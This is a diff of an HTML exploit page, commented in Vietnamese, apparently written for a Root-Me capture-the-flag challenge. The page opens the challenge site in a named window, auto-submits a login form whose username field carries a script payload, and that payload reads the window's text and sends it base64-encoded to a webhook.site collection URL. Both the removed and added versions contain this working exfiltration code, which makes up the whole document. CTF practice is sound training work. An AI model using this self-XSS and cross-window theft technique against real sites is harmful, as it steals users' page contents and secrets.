@@ -1,50 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Exploit</title>
-</head>
 <body>
     <script>
-        // 1. Mở trang Secret và đặt tên định danh là 'secret_vault'
-        // Chúng ta cần dùng link HTTP vì port 58003 thường không chạy SSL
-        var secretWin = window.open("http://challenge01.root-me.org:58003/", "secret_vault");
+        // 1. Mở trang chủ (nơi chứa secret) và đặt tên cửa sổ
+        var win = window.open("http://challenge01.root-me.org:58003/", "secret_vault");
 
         setTimeout(() => {
-            // 2. Tạo form để thực hiện Self-XSS
+            // 2. Tự động POST XSS
             const form = document.createElement('form');
             form.method = 'POST';
             form.action = 'http://challenge01.root-me.org:58003/login';
-            
-            // Mở tab mới để tránh làm mất trang exploit hiện tại
             form.target = "_blank"; 
 
             const input = document.createElement('input');
             input.name = 'username';
             
-            // PAYLOAD JAVASCRIPT THUẦN
-            // Script này sẽ chạy trên domain của challenge
-            input.value = `
-<script>
-    (function() {
-        try {
-            // Tìm cửa sổ có tên 'secret_vault' (cùng origin nên sẽ lấy được)
-            var target = window.open('', 'secret_vault');
-            if (target) {
-                var secret = target.document.documentElement.innerText;
-                fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?data=' + btoa(secret));
-            } else {
-                fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?error=target_not_found');
-            }
-        } catch (e) {
-            fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?error=' + btoa(e.message));
-        }
-    })();
-<\/script>`.trim();
+            // Payload viết trên một dòng duy nhất để tránh lỗi Syntax do xuống dòng
+            // Sử dụng window.name để định danh thay vì gọi window.open lần nữa
+            input.value = `<script>try{var s=window.open('','secret_vault').document.body.innerText;fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?d='+btoa(s))}catch(e){fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?e='+btoa(e.message))}<\/script>`;
 
             form.appendChild(input);
             document.body.appendChild(form);
             form.submit();
-        }, 2000); // Đợi 2 giây để đảm bảo trang Secret đã load xong nội dung
+        }, 2000);
     </script>
 </body>
 </html>
